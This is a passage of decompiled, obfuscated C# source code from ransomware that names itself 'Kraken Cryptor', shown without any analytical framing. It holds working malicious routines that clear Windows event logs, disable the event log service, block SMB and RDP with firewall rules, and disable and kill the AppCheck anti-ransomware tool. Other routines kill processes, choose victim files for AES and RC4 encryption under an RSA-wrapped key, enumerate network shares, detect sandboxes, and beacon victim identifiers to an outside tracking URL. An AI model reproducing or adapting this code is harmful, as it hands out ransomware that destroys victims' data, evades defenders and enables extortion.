						if (!(Class6.Class7.smethod_16().ToUpper() == text3.ToUpper()))
						{
							(*(int*)ptr)++;
							continue;
						}
						((byte*)ptr)[9] = 0;
						goto end_IL_0006;
					}
				}
				if (!Class4.Class5.smethod_18() || Class21.smethod_30())
				{
					if (Class4.Class5.smethod_4())
					{
						Class21.smethod_75("cmd.exe", "/C wevtutil.exe clear-log Application");
						Class21.smethod_75("cmd.exe", "/C wevtutil.exe clear-log Security");
						Class21.smethod_75("cmd.exe", "/C wevtutil.exe clear-log System");
						Class21.smethod_75("cmd.exe", "/C sc config eventlog start=disabled");
						Class21.smethod_75("cmd.exe", "sc stop eventlog");
						Class21.smethod_75("cmd.exe", "/C REG add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\eventlog\" / v Start / t REG_DWORD / d 4 / f");
					}
					if (Class4.Class5.smethod_12() || Class4.Class5.smethod_10())
					{
						Class21.smethod_75("cmd.exe", "/C NetSh Advfirewall set allprofiles state on");
					}
					if (Class4.Class5.smethod_12())
					{
						Class21.smethod_75("cmd.exe", "/C netsh advfirewall firewall add rule name=\"SMB Protocol Block\" protocol=TCP dir=in localport=445 action=block");
					}
					if (Class4.Class5.smethod_10())
					{
						Class21.smethod_75("cmd.exe", "/C netsh advfirewall firewall add rule name=\"RDP Protocol Block\" protocol=TCP dir=in localport=3389 action=block");
					}
					Class21.smethod_52(Class4.Class5.smethod_56());
					if (Class21.smethod_24("appcheck"))
					{
						Class21.smethod_75("cmd.exe", "/C reg add \"HKLM\\SOFTWARE\\CheckMAL\\AppCheck\" /v ProductVersion /t REG_SZ /d \"Please contact with \"Kraken Cryptor\" support for decrypt your files.\" /f");
						Class21.smethod_75("cmd.exe", "/C reg add \"HKLM\\SOFTWARE\\CheckMAL\\AppCheck\" /v RansomBackupExt/t REG_SZ /d \"NULL\" /f");
						Class21.smethod_75("cmd.exe", "/C reg add \"HKLM\\SOFTWARE\\CheckMAL\\AppCheck\" /v Options /t REG_DWORD /d 0 /f");
						Class21.smethod_75("cmd.exe", "/C taskkill /F /IM appcheck.exe");
					}
					((byte*)ptr)[8] = 1;
					goto IL_06fe;
				}
				((byte*)ptr)[9] = 0;
			}
			end_IL_0006:;
		}
		catch (Exception)
		{
			((byte*)ptr)[8] = 0;
			goto IL_06fe;
		}
		return ((byte*)ptr)[9] != 0;
		IL_06fe:
		return ((byte*)ptr)[8] != 0;
	}

	static string smethod_26(string string_0)
	{
		StringBuilder stringBuilder = new StringBuilder(string_0.Length);
		for (int i = 0; i < string_0.Length; i++)
		{
			if (string_0[i] == '\\')
			{
				i++;
				switch (string_0[i])
				{
				case '\\':
					stringBuilder.Append(string_0[i]);
					break;
				case '/':
					stringBuilder.Append(string_0[i]);
					break;
				case '"':
					stringBuilder.Append(string_0[i]);
					break;
				case 'f':
					stringBuilder.Append('\f');
					break;
				case 'b':
					stringBuilder.Append('\b');
					break;
				case 'r':
					stringBuilder.Append('\r');
					break;
				default:
					stringBuilder.Append(string_0[i]);
					break;
				case 't':
					stringBuilder.Append('\t');
					break;
				case 'u':
					stringBuilder.Append((char)int.Parse(string_0.Substring(i + 1, 4), NumberStyles.AllowHexSpecifier));
					i += 4;
					break;
				case 'n':
					stringBuilder.Append('\n');
					break;
				}
			}
			else
			{
				stringBuilder.Append(string_0[i]);
			}
		}
		return stringBuilder.ToString();
	}

	static IEnumerable<Class15.Class16> smethod_27(Class15 class15_0)
	{
		return new Class15.Class19(-2)
		{
			class15_0 = class15_0
		};
	}

	static void smethod_28(int int_0, Class23.Class25 class25_0, byte[] byte_0, int int_1)
	{
		if (class25_0.int_0 < class25_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_1 + int_0;
		if (0 <= int_1 && int_1 <= num && num <= byte_0.Length)
		{
			if (((uint)int_0 & (true ? 1u : 0u)) != 0)
			{
				class25_0.uint_0 |= (uint)((byte_0[int_1++] & 0xFF) << class25_0.int_2);
				class25_0.int_2 += 8;
			}
			class25_0.byte_0 = byte_0;
			class25_0.int_0 = int_1;
			class25_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static bool smethod_29()
	{
		return PlatformID.Win32NT == Environment.OSVersion.Platform;
	}

	static bool smethod_30()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Console", writable: true);
			if (Registry.GetValue(registryKey.ToString(), "WordLoad", null) == null)
			{
				registryKey.SetValue("WordLoad", 1, RegistryValueKind.DWord);
				return true;
			}
			return false;
		}
		catch (Exception)
		{
		}
		return false;
	}

	static uint smethod_31(uint uint_0)
	{
		return uint_0 + 1;
	}

	static bool smethod_32(string string_0)
	{
		try
		{
			if (Class4.Class5.smethod_52().Contains(new FileInfo(string_0).Name.ToLower()))
			{
				return false;
			}
			if (Class4.Class5.smethod_60() + "." + Class4.Class5.smethod_62() == new FileInfo(string_0).Name)
			{
				return false;
			}
			string text = File.GetAttributes(string_0).ToString().ToLower();
			if (text.Contains("system"))
			{
				return false;
			}
			if (text.Contains("hidden") || text.Contains("readonly") || text.Contains("archive"))
			{
				File.SetAttributes(string_0, FileAttributes.Normal);
			}
			if (new FileInfo(string_0).Length >> 10 == 0L)
			{
				return false;
			}
			if (Class4.Class5.smethod_26() && new FileInfo(string_0).DirectoryName!.Contains("\\\\"))
			{
				return true;
			}
			if (Class4.Class5.smethod_46().Contains(new FileInfo(string_0).Extension.ToLower().Replace(".", "")))
			{
				return true;
			}
			if (Class4.Class5.smethod_26() && !(Environment.SystemDirectory.Substring(0, 1) == new FileInfo(string_0).FullName.Substring(0, 1)))
			{
				return true;
			}
			return false;
		}
		catch (UnauthorizedAccessException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	static void smethod_33(byte[] byte_0, string string_0)
	{
		if (byte_0 == null)
		{
			throw new ArgumentNullException(string_0);
		}
		if (byte_0.Length != 8)
		{
			throw new CryptographicException("Invalid IV size; it must be 8 bytes.");
		}
	}

	static int smethod_34(Class23.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static bool smethod_35(string string_0)
	{
		if (string.IsNullOrEmpty(string_0))
		{
			return false;
		}
		char c = char.ToUpper(string_0[0]);
		if ('A' <= c && c <= 'Z')
		{
			if (Path.VolumeSeparatorChar != string_0[1])
			{
				return false;
			}
			if (Path.DirectorySeparatorChar != string_0[2])
			{
				return false;
			}
			return true;
		}
		return false;
	}

	static string smethod_36(int int_0, bool bool_0 = false)
	{
		Miscellaneous.Class13 CS_0024_003C_003E8__locals0 = new Miscellaneous.Class13();
		CS_0024_003C_003E8__locals0.random_0 = new Random();
		string text = "";
		text = ((!bool_0) ? "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
		return new string((from string_0 in Enumerable.Repeat(text, int_0)
			select string_0[CS_0024_003C_003E8__locals0.random_0.Next(string_0.Length)]).ToArray());
	}

	static bool smethod_37(Class23.Class25 class25_0)
	{
		return class25_0.int_0 == class25_0.int_1;
	}

	static short smethod_38(int int_0)
	{
		return (short)((Class23.Class29.byte_0[int_0 & 0xF] << 12) | (Class23.Class29.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class23.Class29.byte_0[(int_0 >> 8) & 0xF] << 4) | Class23.Class29.byte_0[int_0 >> 12]);
	}

	static bool smethod_39(JsonNode jsonNode_0)
	{
		return (bool)Convert.ChangeType(((JsonBasic)jsonNode_0).m_value, typeof(bool));
	}

	unsafe static bool smethod_40(string string_0)
	{
		void* ptr = stackalloc byte[5];
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
			string text = directoryInfo.Attributes.ToString();
			if (!text.Contains("Hidden") && !text.Contains("System"))
			{
				File.Create(Path.Combine(string_0, "Touch")).Dispose();
				File.Delete(Path.Combine(string_0, "Touch"));
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
				if (!(string_0 == Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)) && (!folderPath.Contains("(x86)") || !(string_0 == folderPath.Replace(" (x86)", ""))))
				{
					string[] array = Class4.Class5.smethod_54();
					*(int*)ptr = 0;
					while (true)
					{
						if (*(int*)ptr < array.Length)
						{
							string text2 = array[*(int*)ptr];
							if (!(directoryInfo.Name.ToLower() == text2))
							{
								(*(int*)ptr)++;
								continue;
							}
							((byte*)ptr)[4] = 0;
							break;
						}
						((byte*)ptr)[4] = 1;
						break;
					}
				}
				else
				{
					((byte*)ptr)[4] = 0;
				}
			}
			else
			{
				((byte*)ptr)[4] = 0;
			}
		}
		catch (Exception)
		{
			((byte*)ptr)[4] = 0;
		}
		return ((byte*)ptr)[4] != 0;
	}

	static void smethod_41(Class23.Class26 class26_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class26_0.byte_0[class26_0.int_0++] = class26_0.byte_0[int_0++];
			class26_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static uint smethod_42(int int_0, uint uint_0)
	{
		return (uint_0 << int_0) | (uint_0 >> 32 - int_0);
	}

	static string smethod_43()
	{
		string text = "";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Keyboard Layout\\Preload");
			string[] valueNames = registryKey.GetValueNames();
			foreach (string name in valueNames)
			{
				text = text + $"{Class21.smethod_108((string)registryKey.GetValue(name))}" + ",";
			}
		}
		catch (Exception)
		{
		}
		return text.TrimEnd(new char[1] { ',' });
	}

	static void smethod_44(string string_0 = "", string string_1 = "http://blasze.tk/CN18R3")
	{
		try
		{
			HttpWebRequest obj = (HttpWebRequest)WebRequest.Create(string_1);
			obj.Timeout = 10000;
			obj.AllowAutoRedirect = true;
			obj.UserAgent = $"{Class6.Class7.smethod_16()}-{Class6.Class7.smethod_26()}:{string_0}";
			HttpWebResponse httpWebResponse = (HttpWebResponse)obj.GetResponse();
			new StreamReader(httpWebResponse.GetResponseStream(), Encoding.GetEncoding(httpWebResponse.CharacterSet)).ReadToEnd();
		}
		catch (Exception)
		{
		}
	}

	unsafe static byte[] smethod_45(byte[] byte_0, byte[] byte_1)
	{
		void* ptr = stackalloc byte[8];
		int[] array = new int[256];
		int[] array2 = new int[256];
		byte[] array3 = new byte[byte_0.Length];
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = byte_1[i % byte_1.Length];
			array2[i] = i;
		}
		i = 0;
		int num = 0;
		for (; i < 256; i++)
		{
			num = (num + array2[i] + array[i]) % 256;
			*(int*)((byte*)ptr + 4) = array2[i];
			array2[i] = array2[num];
			array2[num] = *(int*)((byte*)ptr + 4);
		}
		i = 0;
		num = 0;
		int num2 = 0;
		for (; i < byte_0.Length; i++)
		{
			num2++;
			num2 %= 256;
			num += array2[num2];
			num %= 256;
			*(int*)((byte*)ptr + 4) = array2[num2];
			array2[num2] = array2[num];
			array2[num] = *(int*)((byte*)ptr + 4);
			*(int*)ptr = array2[(array2[num2] + array2[num]) % 256];
			array3[i] = (byte)(byte_0[i] ^ *(uint*)ptr);
		}
		return array3;
	}

	unsafe static void smethod_46(string string_0, Class3 class3_0)
	{
		void* ptr = stackalloc byte[26];
		*(int*)ptr = 50;
		Type typeFromHandle = typeof(Class3.Struct2);
		*(int*)((byte*)ptr + 4) = Marshal.SizeOf(typeFromHandle);
		*(ushort*)((byte*)ptr + 20) = (ushort)(20 * *(int*)((byte*)ptr + 4));
		IntPtr intPtr = Marshal.AllocHGlobal(*(ushort*)((byte*)ptr + 20));
		try
		{
			*(int*)((byte*)ptr + 8) = Class21.NetShareEnum(string_0, *(int*)ptr, intPtr, *(ushort*)((byte*)ptr + 20), out *(ushort*)((byte*)ptr + 22), out *(ushort*)((byte*)ptr + 24));
			if (124 == *(int*)((byte*)ptr + 8))
			{
				*(int*)ptr = 1;
				typeFromHandle = typeof(Class3.Struct3);
				*(int*)((byte*)ptr + 4) = Marshal.SizeOf(typeFromHandle);
				*(int*)((byte*)ptr + 8) = Class21.NetShareEnum(string_0, *(int*)ptr, intPtr, *(ushort*)((byte*)ptr + 20), out *(ushort*)((byte*)ptr + 22), out *(ushort*)((byte*)ptr + 24));
			}
			if (*(int*)((byte*)ptr + 8) != 0 && 234 != *(int*)((byte*)ptr + 8))
			{
				Console.WriteLine(*(int*)((byte*)ptr + 8));
				return;
			}
			*(int*)((byte*)ptr + 12) = 0;
			*(int*)((byte*)ptr + 16) = intPtr.ToInt32();
			while (*(int*)((byte*)ptr + 12) < *(ushort*)((byte*)ptr + 22))
			{
				IntPtr ptr2 = new IntPtr(*(int*)((byte*)ptr + 16));
				if (1 == *(int*)ptr)
				{
					Class3.Struct3 @struct = (Class3.Struct3)Marshal.PtrToStructure(ptr2, typeFromHandle);
					class3_0.method_0(@struct.string_0, string.Empty, @struct.method_0(), @struct.string_1);
				}
				else
				{
					Class3.Struct2 struct2 = (Class3.Struct2)Marshal.PtrToStructure(ptr2, typeFromHandle);
					class3_0.method_0(struct2.string_0, struct2.string_2, struct2.method_0(), struct2.string_1);
				}
				(*(int*)((byte*)ptr + 12))++;
				*(int*)((byte*)ptr + 16) += *(int*)((byte*)ptr + 4);
			}
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	unsafe static bool smethod_47(Class23.Class28 class28_0, Class23.Class25 class25_0)
	{
		void* ptr = stackalloc byte[12];
		while (true)
		{
			*(int*)ptr = class28_0.int_2;
			switch (*(int*)ptr)
			{
			case 5:
			{
				*(int*)((byte*)ptr + 8) = Class23.Class28.int_1[class28_0.int_7];
				int num = Class21.smethod_65(class25_0, *(int*)((byte*)ptr + 8));
				if (num >= 0)
				{
					Class21.smethod_7(class25_0, *(int*)((byte*)ptr + 8));
					num += Class23.Class28.int_0[class28_0.int_7];
					while (num-- > 0)
					{
						byte[] byte_ = class28_0.byte_1;
						*(int*)ptr = class28_0.int_8;
						class28_0.int_8 = *(int*)ptr + 1;
						byte_[*(int*)ptr] = class28_0.byte_2;
					}
					if (class28_0.int_8 == class28_0.int_6)
					{
						return true;
					}
					goto IL_0084;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class21.smethod_64(class28_0.class27_0, class25_0)) & -16) == 0)
				{
					byte[] byte_2 = class28_0.byte_1;
					*(int*)ptr = class28_0.int_8;
					class28_0.int_8 = *(int*)ptr + 1;
					byte_2[*(int*)ptr] = (class28_0.byte_2 = (byte)num2);
					if (class28_0.int_8 == class28_0.int_6)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class28_0.byte_2 = 0;
					}
					class28_0.int_7 = num2 - 16;
					class28_0.int_2 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (class28_0.int_8 < class28_0.int_5)
				{
					*(int*)((byte*)ptr + 4) = Class21.smethod_65(class25_0, 3);
					if (*(int*)((byte*)ptr + 4) >= 0)
					{
						Class21.smethod_7(class25_0, 3);
						class28_0.byte_0[Class23.Class28.int_9[class28_0.int_8]] = (byte)(*(uint*)((byte*)ptr + 4));
						class28_0.int_8++;
						continue;
					}
					return false;
				}
				class28_0.class27_0 = new Class23.Class27(class28_0.byte_0);
				class28_0.byte_0 = null;
				class28_0.int_8 = 0;
				class28_0.int_2 = 4;
				goto case 4;
			case 2:
				class28_0.int_5 = Class21.smethod_65(class25_0, 4);
				if (class28_0.int_5 >= 0)
				{
					class28_0.int_5 += 4;
					Class21.smethod_7(class25_0, 4);
					class28_0.byte_0 = new byte[19];
					class28_0.int_8 = 0;
					class28_0.int_2 = 3;
					goto case 3;
				}
				return false;
			case 1:
				class28_0.int_4 = Class21.smethod_65(class25_0, 5);
				if (class28_0.int_4 >= 0)
				{
					class28_0.int_4++;
					Class21.smethod_7(class25_0, 5);
					class28_0.int_6 = class28_0.int_3 + class28_0.int_4;
					class28_0.byte_1 = new byte[class28_0.int_6];
					class28_0.int_2 = 2;
					goto case 2;
				}
				return false;
			case 0:
				class28_0.int_3 = Class21.smethod_65(class25_0, 5);
				if (class28_0.int_3 >= 0)
				{
					class28_0.int_3 += 257;
					Class21.smethod_7(class25_0, 5);
					class28_0.int_2 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_0084:
			class28_0.int_2 = 4;
		}
	}

	[DllImport("netapi32")]
	static extern int NetApiBufferFree(IntPtr intptr_0);

	static byte[] smethod_48(string string_0, byte[] byte_0)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		try
		{
			rSACryptoServiceProvider.FromXmlString($"<RSAKeyValue><Modulus>{string_0}</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
			return rSACryptoServiceProvider.Encrypt(byte_0, fOAEP: true);
		}
		catch (Exception)
		{
		}
		finally
		{
			rSACryptoServiceProvider.Clear();
		}
		return null;
	}

	unsafe static int smethod_49(byte[] byte_0, int int_0, Class23.Class26 class26_0, int int_1)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = class26_0.int_0;
		if (int_0 > class26_0.int_1)
		{
			int_0 = class26_0.int_1;
		}
		else
		{
			*(int*)ptr = (class26_0.int_0 - class26_0.int_1 + int_0) & 0x7FFF;
		}
		*(int*)((byte*)ptr + 4) = int_0;
		*(int*)((byte*)ptr + 8) = int_0 - *(int*)ptr;
		if (*(int*)((byte*)ptr + 8) > 0)
		{
			Array.Copy(class26_0.byte_0, 32768 - *(int*)((byte*)ptr + 8), byte_0, int_1, *(int*)((byte*)ptr + 8));
			int_1 += *(int*)((byte*)ptr + 8);
			int_0 = *(int*)ptr;
		}
		Array.Copy(class26_0.byte_0, *(int*)ptr - int_0, byte_0, int_1, int_0);
		class26_0.int_1 -= *(int*)((byte*)ptr + 4);
		if (class26_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return *(int*)((byte*)ptr + 4);
	}

	static byte[] smethod_50(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		try
		{
			using MemoryStream memoryStream = new MemoryStream();
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			if (Class4.Class5.smethod_44() != 16 && Class4.Class5.smethod_44() != 128)
			{
				if (Class4.Class5.smethod_44() != 32 && Class4.Class5.smethod_44() != 256)
				{
					return null;
				}
				rijndaelManaged.KeySize = 256;
				byte_0 = Class21.smethod_15(1024, 32, byte_0, byte_1);
			}
			else
			{
				rijndaelManaged.KeySize = 128;
				byte_0 = Class21.smethod_15(1024, 16, byte_0, byte_1);
			}
			rijndaelManaged.BlockSize = 128;
			rijndaelManaged.Key = byte_0;
			rijndaelManaged.IV = byte_1;
			rijndaelManaged.Mode = CipherMode.CBC;
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_2, 0, byte_2.Length);
				cryptoStream.Close();
			}
			return memoryStream.ToArray();
		}
		catch (Exception)
		{
		}
		return null;
	}

	static DateTime smethod_51(int int_0)
	{
		return new DateTime((int_0 >> 25) + 1980, (int_0 >> 21) & 0xF, (int_0 >> 16) & 0x1F, (int_0 >> 11) & 0x1F, (int_0 >> 5) & 0x3F, (int_0 & 0x1F) * 2);
	}

	unsafe static bool smethod_52(string[] string_0)
	{
		void* ptr = stackalloc byte[9];
		try
		{
			string[] array = Class21.smethod_11("tasklist", "/V /FO CSV").Split(new string[3] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
			List<string> list = new List<string>();
			*(int*)ptr = 0;
			while (*(int*)ptr < array.Length)
			{
				string text = array[*(int*)ptr].Split(new char[1] { ',' })[0].ToLower().Replace("\"", "");
				if (!(text == "") && text.Contains(".exe"))
				{
					list.Add(array[*(int*)ptr].Split(new char[1] { ',' })[0].ToLower().Replace("\"", "").Replace(".exe", ""));
				}
				(*(int*)ptr)++;
			}
			string[] array2 = list.ToArray();
			*(int*)((byte*)ptr + 4) = 0;
			while (*(int*)((byte*)ptr + 4) < array2.Length)
			{
				string text2 = array2[*(int*)((byte*)ptr + 4)];
				if (string_0.Contains(text2))
				{
					Class21.smethod_75("taskkill", $"/F /IM {text2}.exe");
				}
				(*(int*)((byte*)ptr + 4))++;
			}
			((byte*)ptr)[8] = 1;
		}
		catch (Exception)
		{
			((byte*)ptr)[8] = 0;
		}
		return ((byte*)ptr)[8] != 0;
	}

	static byte[] smethod_53(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		try
		{
			using Class8.Class9 @class = new Class8.Class9();
			using MemoryStream memoryStream = new MemoryStream();
			@class.Key = byte_0;
			@class.IV = byte_2;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, @class.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_1, 0, byte_1.Length);
			}
			return memoryStream.ToArray();
		}
		catch (Exception)
		{
			return null;
		}
	}

	static uint smethod_54(uint uint_0, uint uint_1)
	{
		return uint_0 + uint_1;
	}

	static void smethod_55(uint uint_0, byte[] byte_0, int int_0)
	{
		byte_0[int_0] = (byte)uint_0;
		byte_0[int_0 + 1] = (byte)(uint_0 >> 8);
		byte_0[int_0 + 2] = (byte)(uint_0 >> 16);
		byte_0[int_0 + 3] = (byte)(uint_0 >> 24);
	}

	static bool smethod_56()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		if (PlatformID.Win32NT == oSVersion.Platform && oSVersion.Version.Major >= 5)
		{
			return true;
		}
		return false;
	}

	static uint smethod_57(Class15.Class17 class17_0)
	{
		return class17_0.uint_1 ^ 0xFFFFFFFFu;
	}

	static bool smethod_58()
	{
		try
		{
			string text = "";
			text = Class21.smethod_75("wmic", "path win32_VideoController get name");
			if (string.IsNullOrEmpty(text))
			{
				return false;
			}
			Class21.smethod_75("tasklist", "m");
			if (text.Contains("VirtualBox Graphics Adapter") || text.Contains("VMware SVGA") || text.Contains("Parallels Video Adapter") || text.Contains("PVM Additions S3 Trio32/64") || text.Contains("S3 Trio32/64") || Class21.smethod_21("xenservice") || Class21.smethod_21("VMSrvc") || Class21.smethod_21("VMUSrvc") || Class21.smethod_21("VBoxTrayToolWndClass") || Class21.smethod_21("VBoxTrayToolWnd") || Class21.smethod_21("vmtoolsd") || Class21.smethod_21("vmwaretray") || Class21.smethod_21("vmwareuser") || Class21.smethod_21("VGAuthService") || Class21.smethod_21("vmacthlp") || Class21.smethod_21("prl_cc") || Class21.smethod_21("prl_tools") || Class21.smethod_21("vmtoolsd"))
			{
				text = Class21.smethod_75("wmic", "path MSAcpi_ThermalZoneTemperature");
			}
			if (string.IsNullOrEmpty(text))
			{
				return false;
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	static string[] smethod_59(string string_0)
	{
		return string_0.Replace("[\n\t\"", "").Replace("\n\t\"", "").Replace("\"", "")
			.Replace("\n]", "")
			.Replace("[\n\t", "")
			.Replace("\n\t", "")
			.Split(new char[1] { ',' });
	}

	static void smethod_60(JsonArray.Class1 class1_0)
	{
		class1_0.int_0 = -1;
		((IDisposable)class1_0.enumerator_0).Dispose();
	}

	static Class23.Class27 smethod_61(Class23.Class28 class28_0)
	{
		byte[] array = new byte[class28_0.int_4];
		Array.Copy(class28_0.byte_1, class28_0.int_3, array, 0, class28_0.int_4);
		return new Class23.Class27(array);
	}

	static int smethod_62(Class23.Class26 class26_0)
	{
		return class26_0.int_1;
	}

	static void smethod_63(JsonObject.Class0 class0_0)
	{
		class0_0.int_0 = -1;
		((IDisposable)class0_0.enumerator_0).Dispose();
	}

	unsafe static int smethod_64(Class23.Class27 class27_0, Class23.Class25 class25_0)
	{
		void* ptr = stackalloc byte[16];
		int num;
		int num2;
		if ((num = Class21.smethod_65(class25_0, 9)) >= 0)
		{
			if ((num2 = class27_0.short_0[num]) >= 0)
			{
				Class21.smethod_7(class25_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)ptr = -(num2 >> 4);
			*(int*)((byte*)ptr + 4) = num2 & 0xF;
			if ((num = Class21.smethod_65(class25_0, *(int*)((byte*)ptr + 4))) >= 0)
			{
				num2 = class27_0.short_0[*(int*)ptr | (num >> 9)];
				Class21.smethod_7(class25_0, num2 & 0xF);
				return num2 >> 4;
			}
			*(int*)((byte*)ptr + 8) = class25_0.int_2;
			num = Class21.smethod_65(class25_0, *(int*)((byte*)ptr + 8));
			num2 = class27_0.short_0[*(int*)ptr | (num >> 9)];
			if ((num2 & 0xF) <= *(int*)((byte*)ptr + 8))
			{
				Class21.smethod_7(class25_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		*(int*)((byte*)ptr + 12) = class25_0.int_2;
		num = Class21.smethod_65(class25_0, *(int*)((byte*)ptr + 12));
		num2 = class27_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= *(int*)((byte*)ptr + 12))
		{
			Class21.smethod_7(class25_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	static int smethod_65(Class23.Class25 class25_0, int int_0)
	{
		if (class25_0.int_2 < int_0)
		{
			if (class25_0.int_0 == class25_0.int_1)
			{
				return -1;
			}
			class25_0.uint_0 |= (uint)(((class25_0.byte_0[class25_0.int_0++] & 0xFF) | ((class25_0.byte_0[class25_0.int_0++] & 0xFF) << 8)) << class25_0.int_2);
			class25_0.int_2 += 16;
		}
		return (int)(class25_0.uint_0 & ((1 << int_0) - 1));
	}

	unsafe static string[] smethod_66(string string_0)
	{
		void* ptr = stackalloc byte[6];
		string[] array = new string[2];
		((byte*)ptr)[4] = 0;
		((byte*)ptr)[5] = 0;
		*(int*)ptr = 0;
		while (*(int*)ptr < string_0.Length && ((byte*)ptr)[5] == 0)
		{
			if (string_0[*(int*)ptr] == '"' && (*(int*)ptr == 0 || string_0[*(int*)ptr - 1] != '\\'))
			{
				if (((byte*)ptr)[4] == 0)
				{
					((byte*)ptr)[4] = 1;
					(*(int*)ptr)++;
				}
				else
				{
					array[0] = string_0.Substring(1, *(int*)ptr - 1);
					array[1] = string_0.Substring(*(int*)ptr + 2);
					((byte*)ptr)[5] = 1;
				}
			}
			else
			{
				(*(int*)ptr)++;
			}
		}
		return array;
	}

	static object smethod_67(JsonBasic jsonBasic_0)
	{
		return jsonBasic_0.m_value;
	}

	unsafe static string smethod_68(JsonNode jsonNode_0)
	{
		void* ptr = stackalloc byte[9];
		string text = jsonNode_0.vmethod_0();
		string text2 = string.Empty;
		*(int*)ptr = 0;
		while (*(int*)ptr < 1)
		{
			text2 += "\t";
			(*(int*)ptr)++;
		}
		((byte*)ptr)[8] = 0;
		string text3 = string.Empty;
		*(int*)((byte*)ptr + 4) = 0;
		while (*(int*)((byte*)ptr + 4) < text.Length)
		{
			switch (text[*(int*)((byte*)ptr + 4)])
			{
			case ':':
				if (((byte*)ptr)[8] == 0)
				{
					text = text.Insert(*(int*)((byte*)ptr + 4) + 1, " ");
				}
				break;
			case ',':
				if (((byte*)ptr)[8] == 0)
				{
					text = text.Insert(*(int*)((byte*)ptr + 4) + 1, "\n" + text3);
				}
				break;
			case '"':
				if (*(int*)((byte*)ptr + 4) == 0 || text[*(int*)((byte*)ptr + 4) - 1] != '\\')
				{
					((byte*)ptr)[8] = ((((byte*)ptr)[8] == 0) ? ((byte)1) : ((byte)0));
				}
				break;
			case ']':
			case '}':
				if (((byte*)ptr)[8] == 0)
				{
					text3 = text3.Substring(0, text3.Length - text2.Length);
					text = text.Insert(*(int*)((byte*)ptr + 4), "\n" + text3);
					*(int*)((byte*)ptr + 4) += text3.Length + 1;
				}
				break;
			case '[':
			case '{':
				if (((byte*)ptr)[8] == 0)
				{
					text3 += text2;
					text = text.Insert(*(int*)((byte*)ptr + 4) + 1, "\n" + text3);
				}
				break;
			}
			(*(int*)((byte*)ptr + 4))++;
		}
		return text;
	}

	unsafe static string smethod_69(string string_0, int int_0)
	{
		void* ptr = stackalloc byte[20];
		*(double*)ptr = Math.Ceiling((double)string_0.Length / (double)int_0);
		if (*(double*)ptr < 2.0)
		{
			return string_0;
		}
		StringBuilder stringBuilder = new StringBuilder();
		*(int*)((byte*)ptr + 8) = 0;
		while ((double)(*(int*)((byte*)ptr + 8)) < *(double*)ptr)
		{
			if (*(int*)((byte*)ptr + 8) > 0)
			{
				stringBuilder.Append(Environment.NewLine);
			}
			*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 8) * int_0;
			*(int*)((byte*)ptr + 16) = Math.Min(int_0, string_0.Length - *(int*)((byte*)ptr + 12));
			string value = string_0.Substring(*(int*)((byte*)ptr + 12), *(int*)((byte*)ptr + 16));
			stringBuilder.Append(value);
			(*(int*)((byte*)ptr + 8))++;
		}
		return stringBuilder.ToString();
	}

	static Class15.Class16 smethod_70(Class15 class15_0, string string_0)
	{
		Class15.Class18 CS_0024_003C_003E8__locals0 = new Class15.Class18();
		CS_0024_003C_003E8__locals0.string_0 = string_0;
		CS_0024_003C_003E8__locals0.string_0 = CS_0024_003C_003E8__locals0.string_0.Replace("\\", "/").Trim().TrimStart(new char[1] { '/' });
		return Class21.smethod_72(class15_0).FirstOrDefault((Class15.Class16 class16_0) => class16_0.method_0() == CS_0024_003C_003E8__locals0.string_0) ?? throw new FileNotFoundException("File not found in the archive: " + CS_0024_003C_003E8__locals0.string_0);
	}

	static void smethod_71(string string_0, Class15 class15_0, string string_1)
	{
		Class15.Class16 @class = Class21.smethod_70(class15_0, string_1);
		using (FileStream stream_ = File.Create(string_0))
		{
			Class21.smethod_79((Stream)stream_, @class, class15_0);
		}
		FileInfo fileInfo = new FileInfo(string_0);
		if (fileInfo.Length != @class.method_6())
		{
			throw new InvalidDataException($"Corrupted archive: {string_0} has an uncompressed size {fileInfo.Length} which does not match its expected size {@class.method_6()}");
		}
